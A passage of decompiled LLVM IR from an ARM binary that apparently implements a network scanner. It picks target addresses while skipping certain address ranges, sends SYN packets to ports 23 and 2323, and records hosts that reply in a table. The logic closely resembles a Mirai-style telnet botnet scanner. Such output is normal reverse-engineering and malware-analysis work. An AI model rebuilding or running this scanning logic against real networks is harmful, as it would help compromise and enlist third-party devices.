  %v8_e9f8 = icmp eq i32 %v1_e884, 26
  store i1 %v8_e9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9f8, label %dec_label_pc_e880, label %dec_label_pc_ea00

dec_label_pc_ea00:                                ; preds = %bb396
  %v2_ea00 = icmp ugt i32 %v1_e884, 29
  store i1 %v2_ea00, i1* %cpsr_c.global-to-local, align 1
  %v7_ea00 = icmp eq i32 %v1_e884, 30
  store i1 %v7_ea00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea00, label %dec_label_pc_e880, label %bb397

bb397:                                            ; preds = %dec_label_pc_ea00
  %v3_ea04 = icmp ugt i32 %v1_e884, 28
  store i1 %v3_ea04, i1* %cpsr_c.global-to-local, align 1
  %v8_ea04 = icmp eq i32 %v1_e884, 29
  store i1 %v8_ea04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea04, label %dec_label_pc_e880, label %dec_label_pc_ea0c

dec_label_pc_ea0c:                                ; preds = %bb397
  %v2_ea0c = icmp ugt i32 %v1_e884, 54
  store i1 %v2_ea0c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea0c = icmp eq i32 %v1_e884, 55
  store i1 %v7_ea0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea0c, label %dec_label_pc_e880, label %bb398

bb398:                                            ; preds = %dec_label_pc_ea0c
  %v3_ea10 = icmp ugt i32 %v1_e884, 32
  store i1 %v3_ea10, i1* %cpsr_c.global-to-local, align 1
  %v8_ea10 = icmp eq i32 %v1_e884, 33
  store i1 %v8_ea10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea10, label %dec_label_pc_e880, label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %bb398
  %v2_ea18 = icmp ugt i32 %v1_e884, 214
  store i1 %v2_ea18, i1* %cpsr_c.global-to-local, align 1
  %v7_ea18 = icmp eq i32 %v1_e884, 215
  store i1 %v7_ea18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea18, label %.thread48, label %bb399

bb399:                                            ; preds = %dec_label_pc_ea18
  %v3_ea1c = icmp ugt i32 %v1_e884, 213
  store i1 %v3_ea1c, i1* %cpsr_c.global-to-local, align 1
  %v8_ea1c = icmp eq i32 %v1_e884, 214
  store i1 %v8_ea1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea1c, label %bb400, label %dec_label_pc_ea2c

.thread48:                                        ; preds = %dec_label_pc_ea18
  br label %dec_label_pc_e880

bb400:                                            ; preds = %bb399
  br label %dec_label_pc_e880

dec_label_pc_ea2c:                                ; preds = %bb399
  %v5_ea38 = call i32 @llvm.bswap.i32(i32 %v0_e880)
  store i32 %v5_ea38, i32* %r3.global-to-local, align 4
  %tmp401 = and i32 %v0_e880, 65280
  %tmp402 = call i32 @llvm.bswap.i32(i32 %tmp401)
  %v3_ea40 = udiv i32 %v5_ea38, 16777216
  %tmp403 = and i32 %v0_e880, 16711680
  %tmp404 = call i32 @llvm.bswap.i32(i32 %tmp403)
  %v4_ea48 = udiv i32 %tmp402, 256
  %v4_ea4c = mul nuw nsw i32 %tmp404, 256
  store i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32* @r0, align 4
  %tmp405 = and i32 %v0_e880, 65536
  %v3_ea54 = icmp ne i32 %tmp405, 0
  store i1 %v3_ea54, i1* %cpsr_c.global-to-local, align 1
  %v4_ea54 = mul i32 %v5_ea38, 16777216
  %v5_ea48 = or i32 %v4_ea54, %v3_ea40
  %v5_ea4c = or i32 %v5_ea48, %v4_ea48
  %v5_ea54 = or i32 %v5_ea4c, %v4_ea4c
  store i32 %v5_ea54, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_1e726.177 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_ea54, i32* @global_var_1e72c.178, align 4
  %v3_ea64 = call i32 @function_c848(i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32 20)
  %v4_ea64 = trunc i32 %v3_ea64 to i16
  store i32 %v3_ea64, i32* %r0.global-to-local, align 4
  %v3_ea68 = load i32, i32* %stack_var_-52, align 4
  %v5_ea78 = sdiv i32 %v3_ea68, 10
  %v3_ea7c = mul i32 %v5_ea78, 8
  store i32 %v3_ea7c, i32* %r2.global-to-local, align 4
  %v2_ea84 = mul i32 %v5_ea78, 10
  store i32 %v2_ea84, i32* %r3.global-to-local, align 4
  %v3_ea88 = icmp uge i32 %v3_ea68, %v2_ea84
  store i1 %v3_ea88, i1* %cpsr_c.global-to-local, align 1
  %v9_ea88 = icmp eq i32 %v3_ea68, %v2_ea84
  store i1 %v9_ea88, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32* %r1.global-to-local, align 4
  br i1 %v9_ea88, label %bb406, label %.thread60

.thread60:                                        ; preds = %dec_label_pc_ea2c
  store i32 ptrtoint (i16* @global_var_1e730.138 to i32), i32* %r3.global-to-local, align 4
  store i16 %v4_ea64, i16* bitcast (i32* @global_var_1e726.177 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32* %r0.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1e730.138 to i32), i32 2) to i16*), align 2
  %v4_eaa8 = load i32, i32* @global_var_1e72c.178, align 4
  store i32 %v4_eaa8, i32* @global_var_1e734.180, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb407

bb406:                                            ; preds = %dec_label_pc_ea2c
  store i16 %v4_ea64, i16* bitcast (i32* @global_var_1e726.177 to i16*), align 4
  store i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32* %r0.global-to-local, align 4
  %v4_eaa854 = load i32, i32* @global_var_1e72c.178, align 4
  store i32 ptrtoint (i16* @global_var_1e730.138 to i32), i32* %r2.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i32 %v4_eaa854, i32* @global_var_1e734.180, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_1e730.138 to i32), i32 2) to i16*), align 2
  br label %bb407

bb407:                                            ; preds = %.thread60, %bb406
  store i16 0, i16* bitcast (i32* @global_var_1e740.181 to i16*), align 4
  store i32 ptrtoint (i16* @global_var_1e730.138 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v6_ead4 = call i32 @function_c898(i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32 sext (i16 ptrtoint (i16* @global_var_1e730.138 to i16) to i32), i32 5120, i32 20)
  %v7_ead4 = trunc i32 %v6_ead4 to i16
  store i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32* %r1.global-to-local, align 4
  %v2_eae0 = load i32, i32* @global_var_207a0.133, align 4
  store i16 %v7_ead4, i16* bitcast (i32* @global_var_1e740.181 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  store i32 %v2_f980, i32* %ip.global-to-local, align 4
  store i32 %v2_eae0, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_eb28 = call i32 @function_11338(i32 %v2_eae0, i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32 40, i32 16384, i32 %v2_e850, i32 16)
  store i32 %v7_eb28, i32* %r0.global-to-local, align 4
  %v3_eb2c = load i32, i32* %stack_var_-52, align 4
  %v1_eb30 = add i32 %v3_eb2c, 1
  store i32 %v1_eb30, i32* %r3.global-to-local, align 4
  %v3_eb34 = icmp ugt i32 %v1_eb30, 383
  store i1 %v3_eb34, i1* %cpsr_c.global-to-local, align 1
  %v8_eb34 = icmp eq i32 %v1_eb30, 384
  store i1 %v8_eb34, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eb30, i32* %stack_var_-52, align 4
  %v5_eb3c = icmp slt i32 %v1_eb30, 384
  br i1 %v5_eb3c, label %dec_label_pc_e854, label %dec_label_pc_eb40

dec_label_pc_eb40:                                ; preds = %bb407
  %v0_eb40 = load i32, i32* @r4, align 4
  br label %dec_label_pc_eb44

dec_label_pc_eb44:                                ; preds = %dec_label_pc_e830, %dec_label_pc_eb40
  %stack_var_-1876.1 = phi i32 [ %stack_var_-1876.0, %dec_label_pc_e830 ], [ %v0_eb40, %dec_label_pc_eb40 ]
  %v0_eb44 = call i32 @function_11008()
  store i32 %v0_eb44, i32* %fp.global-to-local, align 4
  store i32 %v2_e828, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_eb54, i32* @r4, align 4
  br label %dec_label_pc_eb58

dec_label_pc_eb58:                                ; preds = %dec_label_pc_ec18, %dec_label_pc_ec10, %dec_label_pc_ec08, %dec_label_pc_ebe4, %dec_label_pc_ebd4, %dec_label_pc_ebb8, %dec_label_pc_eba0, %dec_label_pc_ec00, %dec_label_pc_ebf4, %dec_label_pc_eb98, %dec_label_pc_ecd0, %dec_label_pc_eb44
  %v1_eb5c = phi i32 [ %v0_eb44, %dec_label_pc_eb44 ], [ %v1_eb5c.pre.pre, %dec_label_pc_ecd0 ], [ %v0_eb8c, %dec_label_pc_eb98 ], [ %v0_eb8c, %dec_label_pc_ebf4 ], [ %v0_eb8c, %dec_label_pc_ec00 ], [ %v0_eb8c, %dec_label_pc_eba0 ], [ %v0_eb8c, %dec_label_pc_ebb8 ], [ %v0_eb8c, %dec_label_pc_ebd4 ], [ %v0_eb8c, %dec_label_pc_ebe4 ], [ %v0_eb8c, %dec_label_pc_ec08 ], [ %v0_eb8c, %dec_label_pc_ec10 ], [ %v0_eb8c, %dec_label_pc_ec18 ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_eb5c = inttoptr i32 %v1_eb5c to i32*
  store i32 0, i32* %v2_eb5c, align 4
  %v2_eb68 = load i32, i32* @global_var_207a0.133, align 4
  store i32 %v2_eb68, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_e828, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_eb78 = load i32, i32* %ip.global-to-local, align 4
  %v6_eb80 = call i32 @function_112c4(i32 %v2_eb68, i32 %v2_e828, i32 1514, i32 16384, i32 %v0_eb78, i32 %v0_eb78)
  store i32 %v6_eb80, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb84 = icmp eq i32 %v6_eb80, 0
  store i1 %v2_eb84, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_eb80, 1
  br i1 %tmp408, label %dec_label_pc_ece0, label %dec_label_pc_eb8c

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_eb58
  %v0_eb8c = load i32, i32* %fp.global-to-local, align 4
  %v1_eb8c = inttoptr i32 %v0_eb8c to i32*
  %v2_eb8c = load i32, i32* %v1_eb8c, align 4
  store i32 %v2_eb8c, i32* %r3.global-to-local, align 4
  %v2_eb90 = icmp ugt i32 %v2_eb8c, 10
  store i1 %v2_eb90, i1* %cpsr_c.global-to-local, align 1
  %v7_eb90 = icmp eq i32 %v2_eb8c, 11
  store i1 %v7_eb90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb90, label %dec_label_pc_ece0, label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb8c
  %v2_eb98 = icmp ugt i32 %v6_eb80, 38
  store i1 %v2_eb98, i1* %cpsr_c.global-to-local, align 1
  %v7_eb98 = icmp eq i32 %v6_eb80, 39
  store i1 %v7_eb98, i1* %cpsr_z.global-to-local, align 1
  %v2_eb9c = xor i1 %v2_eb98, true
  %v3_eb9c = or i1 %v7_eb98, %v2_eb9c
  br i1 %v3_eb9c, label %dec_label_pc_eb58, label %dec_label_pc_eba0

dec_label_pc_eba0:                                ; preds = %dec_label_pc_eb98
  store i32 %v2_e828, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20780.45 to i32), i32* %ip.global-to-local, align 4
  %v3_eba8 = load i32, i32* %v2_eba8, align 4
  store i32 %v3_eba8, i32* %r2.global-to-local, align 4
  %v2_ebac = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_ebac, i32* %r3.global-to-local, align 4
  %v3_ebb0 = icmp uge i32 %v3_eba8, %v2_ebac
  store i1 %v3_ebb0, i1* %cpsr_c.global-to-local, align 1
  %v9_ebb0 = icmp eq i32 %v3_eba8, %v2_ebac
  store i1 %v9_ebb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebb0, label %dec_label_pc_ebb8, label %dec_label_pc_eb58

dec_label_pc_ebb8:                                ; preds = %dec_label_pc_eba0
  %v3_ebbc = load i8, i8* %v2_ebbc, align 1
  %v4_ebbc = zext i8 %v3_ebbc to i32
  store i32 %v4_ebbc, i32* %r3.global-to-local, align 4
  %v2_ebc0 = icmp ugt i8 %v3_ebbc, 5
  store i1 %v2_ebc0, i1* %cpsr_c.global-to-local, align 1
  %v7_ebc0 = icmp eq i8 %v3_ebbc, 6
  store i1 %v7_ebc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebc0, label %dec_label_pc_ebc8, label %dec_label_pc_eb58

dec_label_pc_ebc8:                                ; preds = %dec_label_pc_ebb8
  %v0_ebc8 = load i32, i32* @r4, align 4
  %v1_ebc8 = inttoptr i32 %v0_ebc8 to i16*
  %v2_ebc8 = load i16, i16* %v1_ebc8, align 2
  %v3_ebc8 = zext i16 %v2_ebc8 to i32
  store i32 %v3_ebc8, i32* %ip.global-to-local, align 4
  %v2_ebcc = icmp ugt i16 %v2_ebc8, 5887
  store i1 %v2_ebcc, i1* %cpsr_c.global-to-local, align 1
  %v7_ebcc = icmp eq i16 %v2_ebc8, 5888
  store i1 %v7_ebcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ebcc, label %dec_label_pc_ebe4, label %dec_label_pc_ebd4

dec_label_pc_ebd4:                                ; preds = %dec_label_pc_ebc8
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_ebdc = icmp ugt i16 %v2_ebc8, 4872
  store i1 %v3_ebdc, i1* %cpsr_c.global-to-local, align 1
  %v9_ebdc = icmp eq i16 %v2_ebc8, 4873
  store i1 %v9_ebdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebdc, label %dec_label_pc_ebe4, label %dec_label_pc_eb58

dec_label_pc_ebe4:                                ; preds = %dec_label_pc_ebd4, %dec_label_pc_ebc8
  %v1_ebe4 = add i32 %v0_ebc8, 2
  %v2_ebe4 = inttoptr i32 %v1_ebe4 to i16*
  %v3_ebe4 = load i16, i16* %v2_ebe4, align 2
  %v4_ebe4 = zext i16 %v3_ebe4 to i32
  store i32 %v4_ebe4, i32* %r3.global-to-local, align 4
  store i32 %v4_e6f8, i32* %r0.global-to-local, align 4
  %v3_ebec = icmp uge i32 %v4_ebe4, %v4_e6f8
  store i1 %v3_ebec, i1* %cpsr_c.global-to-local, align 1
  %v9_ebec = icmp eq i32 %v4_ebe4, %v4_e6f8
  store i1 %v9_ebec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ebec, label %dec_label_pc_ebf4, label %dec_label_pc_eb58

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_ebe4
  %v1_ebf4 = add i32 %v0_ebc8, 13
  %v2_ebf4 = inttoptr i32 %v1_ebf4 to i8*
  %v3_ebf4 = load i8, i8* %v2_ebf4, align 1
  %v4_ebf4 = zext i8 %v3_ebf4 to i32
  store i32 %v4_ebf4, i32* %r3.global-to-local, align 4
  %v1_ebf8 = and i32 %v4_ebf4, 2
  %v2_ebf8 = icmp eq i32 %v1_ebf8, 0
  store i1 %v2_ebf8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ebf8, label %dec_label_pc_eb58, label %dec_label_pc_ec00

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebf4
  %v1_ec00 = and i32 %v4_ebf4, 16
  %v2_ec00 = icmp eq i32 %v1_ec00, 0
  store i1 %v2_ec00, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec00, label %dec_label_pc_eb58, label %dec_label_pc_ec08

dec_label_pc_ec08:                                ; preds = %dec_label_pc_ec00
  %v1_ec08 = and i32 %v4_ebf4, 4
  %v2_ec08 = icmp eq i32 %v1_ec08, 0
  store i1 %v2_ec08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec08, label %dec_label_pc_ec10, label %dec_label_pc_eb58

dec_label_pc_ec10:                                ; preds = %dec_label_pc_ec08
  %tmp = urem i8 %v3_ebf4, 2
  %v2_ec10 = icmp eq i8 %tmp, 0
  store i1 %v2_ec10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec10, label %dec_label_pc_ec18, label %dec_label_pc_eb58

dec_label_pc_ec18:                                ; preds = %dec_label_pc_ec10
  %v1_ec18 = add i32 %v0_ebc8, 8
  %v2_ec18 = inttoptr i32 %v1_ec18 to i32*
  %v3_ec18 = load i32, i32* %v2_ec18, align 4
  %v5_ec30 = call i32 @llvm.bswap.i32(i32 %v3_ec18)
  %v1_ec34 = add i32 %v5_ec30, -1
  store i32 %v1_ec34, i32* %r2.global-to-local, align 4
  %v1_ec38 = and i32 %v1_ec34, 16711680
  store i32 %v1_ec38, i32* %r0.global-to-local, align 4
  %v3_ec3c = udiv i32 %v1_ec34, 16777216
  %v4_ec44 = udiv i32 %v1_ec38, 256
  %v5_ec44 = or i32 %v4_ec44, %v3_ec3c
  %v1_ec40 = mul i32 %v1_ec34, 256
  %v4_ec48 = and i32 %v1_ec40, 16711680
  %v5_ec48 = or i32 %v5_ec44, %v4_ec48
  store i32 %v5_ec48, i32* %r3.global-to-local, align 4
  store i32 %v2_e828, i32* %r1.global-to-local, align 4
  %v3_ec50 = load i32, i32* %v2_ec50, align 4
  store i32 %v3_ec50, i32* @lr, align 4
  %v5_ec54 = call i32 @llvm.bswap.i32(i32 %v1_ec34)
  store i32 %v5_ec54, i32* %r3.global-to-local, align 4
  %v3_ec58 = icmp uge i32 %v5_ec54, %v3_ec50
  store i1 %v3_ec58, i1* %cpsr_c.global-to-local, align 1
  %v9_ec58 = icmp eq i32 %v5_ec54, %v3_ec50
  store i1 %v9_ec58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ec58, label %dec_label_pc_ec60, label %dec_label_pc_eb58

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec18
  %v0_ec60 = load i32, i32* @r5, align 4
  %v2_ec60 = icmp ugt i32 %v0_ec60, 254
  store i1 %v2_ec60, i1* %cpsr_c.global-to-local, align 1
  %v7_ec60 = icmp eq i32 %v0_ec60, 255
  store i1 %v7_ec60, i1* %cpsr_z.global-to-local, align 1
  %v8_ec64 = icmp sgt i32 %v0_ec60, 255
  br i1 %v8_ec64, label %dec_label_pc_ece0, label %dec_label_pc_ec68

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec60
  %v2_ec70 = load i32, i32* @global_var_2079c.131, align 4
  store i32 %v2_ec70, i32* %r1.global-to-local, align 4
  %v3_ec74 = mul i32 %v0_ec60, 256
  store i32 %v3_ec74, i32* %r2.global-to-local, align 4
  %v2_ec78 = mul i32 %v0_ec60, 288
  store i32 %v2_ec78, i32* %r3.global-to-local, align 4
  %v2_ec7c = add i32 %v2_ec70, %v2_ec78
  store i32 %v2_ec7c, i32* @r0, align 4
  %v1_ec80 = add i32 %v2_ec7c, 12
  %v2_ec80 = inttoptr i32 %v1_ec80 to i32*
  %v3_ec80 = load i32, i32* %v2_ec80, align 4
  store i32 %v3_ec80, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ec84 = icmp eq i32 %v3_ec80, 0
  store i1 %v2_ec84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec84, label %dec_label_pc_ecc8, label %dec_label_pc_eca4.preheader

dec_label_pc_eca4.preheader:                      ; preds = %dec_label_pc_ec68
  %v2_ec88 = add i32 %v0_ec60, 1
  %v2_ec90 = and i32 %v2_ec88, 134217728
  %v3_ec90 = icmp ne i32 %v2_ec90, 0
  store i1 %v3_ec90, i1* %cpsr_c.global-to-local, align 1
  %v3_ec94 = mul i32 %v2_ec88, 288
  %v3_ec98 = add i32 %v2_ec70, %v3_ec94
  store i32 %v3_ec98, i32* %r3.global-to-local, align 4
  store i32 %v0_ec60, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eca4

dec_label_pc_eca4:                                ; preds = %dec_label_pc_eca4.preheader, %dec_label_pc_ecb0
  %v0_ecb0 = phi i32 [ %v3_ec98, %dec_label_pc_eca4.preheader ], [ %v1_ecbc, %dec_label_pc_ecb0 ]
  %v0_eca4 = phi i32 [ %v0_ec60, %dec_label_pc_eca4.preheader ], [ %v1_eca4, %dec_label_pc_ecb0 ]
  %v1_eca4 = add i32 %v0_eca4, 1
  store i32 %v1_eca4, i32* %r2.global-to-local, align 4
  %v7_eca8 = icmp eq i32 %v1_eca4, 256
  br i1 %v7_eca8, label %dec_label_pc_ece0.loopexit, label %dec_label_pc_ecb0

dec_label_pc_ecb0:                                ; preds = %dec_label_pc_eca4
  store i32 %v0_ecb0, i32* @r0, align 4
  %v1_ecb4 = add i32 %v0_ecb0, 12
  %v2_ecb4 = inttoptr i32 %v1_ecb4 to i32*
  %v3_ecb4 = load i32, i32* %v2_ecb4, align 4
  %v2_ecb8 = icmp eq i32 %v3_ecb4, 0
  %v1_ecbc = add i32 %v0_ecb0, 288
  store i32 %v1_ecbc, i32* %r3.global-to-local, align 4
  br i1 %v2_ecb8, label %dec_label_pc_ecc4, label %dec_label_pc_eca4

dec_label_pc_ecc4:                                ; preds = %dec_label_pc_ecb0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eca4, i32* @r5, align 4
  br label %dec_label_pc_ecc8

dec_label_pc_ecc8:                                ; preds = %dec_label_pc_ec68, %dec_label_pc_ecc4
  %v1_ecd0 = phi i32 [ %v2_ec7c, %dec_label_pc_ec68 ], [ %v0_ecb0, %dec_label_pc_ecc4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ecc8 = icmp eq i32 %v1_ecd0, 0
  store i1 %v2_ecc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ecc8, label %dec_label_pc_ece0, label %dec_label_pc_ecd0

dec_label_pc_ecd0:                                ; preds = %dec_label_pc_ecc8
  %v2_ecd0 = add i32 %v1_ecd0, 16
  %v3_ecd0 = inttoptr i32 %v2_ecd0 to i32*
  store i32 %v3_ec50, i32* %v3_ecd0, align 4
  %v0_ecd4 = load i32, i32* %ip.global-to-local, align 4
  %v1_ecd4 = trunc i32 %v0_ecd4 to i16
  %v2_ecd4 = load i32, i32* @r0, align 4
  %v3_ecd4 = add i32 %v2_ecd4, 20
  %v4_ecd4 = inttoptr i32 %v3_ecd4 to i16*
  store i16 %v1_ecd4, i16* %v4_ecd4, align 2
  %v0_ecd8 = call i32 @function_e304()
  store i32 %v0_ecd8, i32* %r0.global-to-local, align 4
  %v1_eb5c.pre.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_eb58

dec_label_pc_ece0.loopexit:                       ; preds = %dec_label_pc_eca4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ece0

dec_label_pc_ece0:                                ; preds = %dec_label_pc_ecc8, %dec_label_pc_ec60, %dec_label_pc_eb8c, %dec_label_pc_eb58, %dec_label_pc_ece0.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_ed00513 = load i32, i32* @sp, align 4
  %v3_ed00514 = add i32 %v2_ed00513, 1676
  %v4_ed00515 = inttoptr i32 %v3_ed00514 to i32*
  store i32 0, i32* %v4_ed00515, align 4
  br label %dec_label_pc_ecec.dec_label_pc_ecec_crit_edge

dec_label_pc_ecec.dec_label_pc_ecec_crit_edge:    ; preds = %dec_label_pc_ece0, %dec_label_pc_ecec.dec_label_pc_ecec_crit_edge
  %v0_ecec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ecf0 = add i32 %v0_ecec.pre, 4
  store i32 %v1_ecf0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ecf8 = add i32 %v0_ecec.pre, 1672
  store i32 %v1_ecf8, i32* %ip.global-to-local, align 4
  %v7_ecfc = icmp eq i32 %v1_ecf0, 128
  %v2_ed00 = load i32, i32* @sp, align 4
  %v3_ed00 = add i32 %v2_ed00, %v1_ecf8
  %v4_ed00 = inttoptr i32 %v3_ed00 to i32*
  store i32 0, i32* %v4_ed00, align 4
  br i1 %v7_ecfc, label %dec_label_pc_ed08, label %dec_label_pc_ecec.dec_label_pc_ecec_crit_edge

dec_label_pc_ed08:                                ; preds = %dec_label_pc_ecec.dec_label_pc_ecec_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed08 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_ed08, i32* %stack_var_-352, align 4
  %v1_ed14516 = add i32 %v0_ed08, 8
  store i32 %v1_ed14516, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed1c517 = add i32 %v0_ed08, 1548
  store i32 %v1_ed1c517, i32* @lr, align 4
  %v7_ed20518 = icmp eq i32 %v1_ed14516, 128
  %v2_ed24519 = load i32, i32* @sp, align 4
  %v3_ed24520 = add i32 %v2_ed24519, %v1_ed1c517
  %v4_ed24521 = inttoptr i32 %v3_ed24520 to i32*
  store i32 0, i32* %v4_ed24521, align 4
  br i1 %v7_ed20518, label %dec_label_pc_ed2c, label %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge

dec_label_pc_ed10.dec_label_pc_ed10_crit_edge:    ; preds = %dec_label_pc_ed08, %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge
  %v0_ed10.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_ed14 = add i32 %v0_ed10.pre, 4
  store i32 %v1_ed14, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_ed1c = add i32 %v0_ed10.pre, 1544
  store i32 %v1_ed1c, i32* @lr, align 4
  %v7_ed20 = icmp eq i32 %v1_ed14, 128
  %v2_ed24 = load i32, i32* @sp, align 4
  %v3_ed24 = add i32 %v2_ed24, %v1_ed1c
  %v4_ed24 = inttoptr i32 %v3_ed24 to i32*
  store i32 0, i32* %v4_ed24, align 4
  br i1 %v7_ed20, label %dec_label_pc_ed2c, label %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ed10.dec_label_pc_ed10_crit_edge, %dec_label_pc_ed08
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_ed2c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_ed2c, i32* @r6, align 4
  store i32 %v0_ed2c, i32* @r5, align 4
  store i32 %v0_ed2c, i32* %stack_var_-52, align 4
  br label %dec_label_pc_ed88

dec_label_pc_ed3c:                                ; preds = %dec_label_pc_edb8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eda4, i1* %cpsr_z.global-to-local, align 1
  %v1_ee28 = add i32 %v2_ed9c, 4
  %v2_ee28 = inttoptr i32 %v1_ee28 to i32*
  %v3_ee28 = load i32, i32* %v2_ee28, align 4
  br i1 %v7_eda4, label %dec_label_pc_ee28, label %dec_label_pc_ed44

dec_label_pc_ed44:                                ; preds = %dec_label_pc_ed3c
  store i32 %v3_ee28, i32* %ip.global-to-local, align 4
  %v3_ed48 = udiv i32 %v3_ee28, 32
  store i32 %v2_ee34, i32* %r0.global-to-local, align 4
  %v3_ed50 = mul nuw nsw i32 %v3_ed48, 4
  %v2_ed54 = add i32 %v3_ed50, %v2_ee34
  store i32 %v2_ed54, i32* %r3.global-to-local, align 4
  %v1_ed58 = add i32 %v2_ed54, -184
  %v2_ed58 = inttoptr i32 %v1_ed58 to i32*
  %v3_ed58 = load i32, i32* %v2_ed58, align 4
  %v1_ed5c = urem i32 %v3_ee28, 32
  store i32 %v1_ed5c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_ed64 = shl i32 1, %v1_ed5c
  %v8_ed64 = or i32 %v3_ed58, %v7_ed64
  store i32 %v8_ed64, i32* %r2.global-to-local, align 4
  store i32 %v8_ed64, i32* %v2_ed58, align 4
  %v0_ed6c = load i32, i32* @r6, align 4
  %v1_ed6c = load i32, i32* %ip.global-to-local, align 4
  %v3_ed6c = icmp uge i32 %v0_ed6c, %v1_ed6c
  store i1 %v3_ed6c, i1* %cpsr_c.global-to-local, align 1
  %v9_ed6c = icmp eq i32 %v0_ed6c, %v1_ed6c
  store i1 %v9_ed6c, i1* %cpsr_z.global-to-local, align 1
  %v5_ed70 = icmp slt i32 %v0_ed6c, %v1_ed6c
  br i1 %v5_ed70, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_ed44
  store i32 %v1_ed6c, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread75, %bb416, %bb414, %bb418, %dec_label_pc_ee1c, %dec_label_pc_ed44, %bb409
